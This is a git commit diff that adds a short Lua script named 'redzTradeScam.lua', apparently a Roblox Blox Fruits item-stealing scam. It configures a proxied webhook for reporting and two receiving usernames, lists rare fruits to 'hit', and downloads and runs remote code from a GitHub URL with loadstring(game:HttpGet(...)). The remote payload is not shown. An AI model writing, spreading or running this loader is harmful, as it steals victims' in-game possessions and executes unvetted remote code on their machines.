dc5ba454c283cd0a1199d3b6a9e007e6460c2627
realredzTradeScam <tt.smartman@gmail.com>
2025-03-09 18:10:23 +0530

    rredzTradeScam.lua

---
+++ redzTradeScam.lua
@@ -0,0 +1,5 @@
+Webhook = "https://webhook-protect.vercel.app/api/webhook?id=bXN6RU5UNTBuSUQ1VXBJRVA3Mzg2dzpXc0pSZEY4dlVGcHlZejRtZ1lvUnVFblY4dzFOWFBydU96eUQ0bFY1cFBvbUN1R1E1SHpVMXBXeTZMeWI3aGhKS2c3cmNLaEo4SVlWcjRCTkVkc015LUZ4Um5BS3J4UlJIM0UwNWZYWVJrUDV5aTEtQlhDbXM3MC1PUjNMR2c1SEZQd29OZlZPQjY2YWdiZW5zd3MwMzhlZm1NYXhpeTFSU1B4QXhJY1VNUnc"
+Usernames = {"UglyAccount69", "DONSLIVER"}
+FruitsToHit = {"Kitsune-Kitsune", "Yeti-Yeti", "Leopard-Leopard", "Gas-Gas", "Dough-Dough", "Control-Control"}
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/surelyco/CutestCodes/refs/heads/main/V2"))()
